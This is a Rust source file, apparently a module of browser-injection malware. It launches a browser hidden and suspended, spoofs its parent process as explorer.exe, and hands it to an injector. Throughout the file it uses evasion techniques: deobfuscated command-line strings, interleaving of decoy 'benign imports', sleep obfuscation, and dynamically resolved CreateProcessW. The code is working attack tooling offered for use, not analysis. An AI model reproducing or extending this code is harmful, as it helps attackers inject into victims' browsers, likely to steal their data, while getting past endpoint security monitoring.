use crate::injector::BrowserInfo;
use kurion_core::common::t_wide;
use windows::core::{PCWSTR, PWSTR};
use windows::Win32::Foundation::{CloseHandle, BOOL, HANDLE};
use windows::Win32::System::Threading::{
    PROCESS_INFORMATION,
    CREATE_SUSPENDED, STARTF_USESHOWWINDOW, DETACHED_PROCESS,
    EXTENDED_STARTUPINFO_PRESENT, STARTUPINFOEXW, LPPROC_THREAD_ATTRIBUTE_LIST,
    InitializeProcThreadAttributeList, UpdateProcThreadAttribute, DeleteProcThreadAttributeList,
    OpenProcess, PROCESS_CREATE_PROCESS,
};
use windows::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Process32FirstW, Process32NextW,
    PROCESSENTRY32W, TH32CS_SNAPPROCESS,
};
use std::ptr;
use std::mem;

const PROC_THREAD_ATTRIBUTE_PARENT_PROCESS: usize = 0x00020000;

fn f_process_by_name(name: &str) -> Option<u32> {
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0).ok()?;

        let mut entry: PROCESSENTRY32W = mem::zeroed();
        entry.dwSize = mem::size_of::<PROCESSENTRY32W>() as u32;

        if Process32FirstW(snapshot, &mut entry).is_ok() {
            loop {
                let exe_name = String::from_utf16_lossy(
                    &entry.szExeFile[..entry.szExeFile.iter().position(|&c| c == 0).unwrap_or(entry.szExeFile.len())]
                );

                if exe_name.to_lowercase() == name.to_lowercase() {
                    let _ = CloseHandle(snapshot);
                    return Some(entry.th32ProcessID);
                }

                if Process32NextW(snapshot, &mut entry).is_err() {
                    break;
                }
            }
        }

        let _ = CloseHandle(snapshot);
        None
    }
}

pub struct ProcessManager {
    browser: BrowserInfo,
    pid: u32,
    h_process: HANDLE,
    h_thread: HANDLE,
}

impl ProcessManager {
    pub fn new(browser: BrowserInfo) -> Self {
        Self {
            browser,
            pid: 0,
            h_process: HANDLE(0 as *mut _),
            h_thread: HANDLE(0 as *mut _),
        }
    }

    pub fn c_suspended(&mut self) -> Result<(), String> {
        let exe_path = &self.browser.full_path;
        if !exe_path.exists() {
            return Err(format!("Browser executable not found: {:?}", exe_path));
        }

        let cmd_line = format!(
            "\"{}\" {}",
            exe_path.to_string_lossy(),
            &crate::deobf(crate::BS_CHROME_ARGS)
        );

        let parent_handle = f_process_by_name(&crate::deobf(crate::BS_EXPLORER))
            .and_then(|pid| {
                unsafe {
                    OpenProcess(PROCESS_CREATE_PROCESS, false, pid).ok()
                }
            });

        let mut startup_info_ex: STARTUPINFOEXW = unsafe { mem::zeroed() };
        startup_info_ex.StartupInfo.cb = mem::size_of::<STARTUPINFOEXW>() as u32;
        startup_info_ex.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
        startup_info_ex.StartupInfo.wShowWindow = 0;

        let mut process_info: PROCESS_INFORMATION = unsafe { mem::zeroed() };
        let mut cmd_line_wide = t_wide(&cmd_line);

        let (creation_flags, use_extended) = if parent_handle.is_some() {
            ((CREATE_SUSPENDED | DETACHED_PROCESS | EXTENDED_STARTUPINFO_PRESENT).0, true)
        } else {
            ((CREATE_SUSPENDED | DETACHED_PROCESS).0, false)
        };

        let mut attr_list_buffer: Vec<u8> = Vec::new();

        if use_extended {
            if let Some(ref parent) = parent_handle {
                unsafe {
                    let mut size: usize = 0;
                    let _ = InitializeProcThreadAttributeList(
                        LPPROC_THREAD_ATTRIBUTE_LIST(ptr::null_mut()),
                        1,
                        0,
                        &mut size as *mut usize,
                    );

                    attr_list_buffer = vec![0u8; size];
                    let attr_list = LPPROC_THREAD_ATTRIBUTE_LIST(attr_list_buffer.as_mut_ptr() as *mut _);

                    if InitializeProcThreadAttributeList(attr_list, 1, 0, &mut size as *mut usize).is_ok() {
                        let parent_handle_ptr = parent as *const HANDLE as *const std::ffi::c_void;
                        let _ = UpdateProcThreadAttribute(
                            attr_list,
                            0,
                            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                            Some(parent_handle_ptr),
                            mem::size_of::<HANDLE>(),
                            None,
                            None,
                        );

                        startup_info_ex.lpAttributeList = attr_list;
                    }
                }
            }
        }

        crate::injector::benign_imports::r_benign_interleave();
        kurion_sys::sleep_obfuscation::j_sleep_range(50, 150);

        unsafe {
            let create_process_fn = match kurion_sys::dynamic_api::r_create_process_w() {
                Some(f) => f,
                None => return Err("Failed to resolve CreateProcessW".to_string())
            };

            let success = create_process_fn(
                PCWSTR::null(),
                PWSTR(cmd_line_wide.as_mut_ptr()),
                ptr::null(),
                ptr::null(),
                BOOL(0),
                creation_flags,
                ptr::null(),
                PCWSTR::null(),
                &startup_info_ex.StartupInfo,
                &mut process_info,
            );

            if use_extended && !attr_list_buffer.is_empty() {
                let attr_list = LPPROC_THREAD_ATTRIBUTE_LIST(attr_list_buffer.as_mut_ptr() as *mut _);
                DeleteProcThreadAttributeList(attr_list);
            }

            if let Some(parent) = parent_handle {
                let _ = CloseHandle(parent);
            }

            if success.as_bool() {
                self.h_process = process_info.hProcess;
                self.h_thread = process_info.hThread;
                self.pid = process_info.dwProcessId;
                Ok(())
            } else {
                Err(format!("CreateProcessW failed (GetLastError)"))
            }
        }
    }

    pub fn g_process_handle(&self) -> HANDLE {
        self.h_process
    }

    pub fn g_pid(&self) -> u32 {
        self.pid
    }

    pub fn terminate(&self) {
        if !self.h_process.is_invalid() {
            unsafe {
                if let Some(terminate_fn) = kurion_sys::dynamic_api::r_terminate_process() {
                     let _ = terminate_fn(self.h_process, 0);
                }
                let _ = CloseHandle(self.h_process);
                if !self.h_thread.is_invalid() {
                     let _ = CloseHandle(self.h_thread);
                }
            }
        }
    }
}

impl Drop for ProcessManager {
    fn drop(&mut self) {
        if !self.h_process.is_invalid() {
             unsafe { let _ = CloseHandle(self.h_process); }
        }
         if !self.h_thread.is_invalid() {
             unsafe { let _ = CloseHandle(self.h_thread); }
        }
    }
}
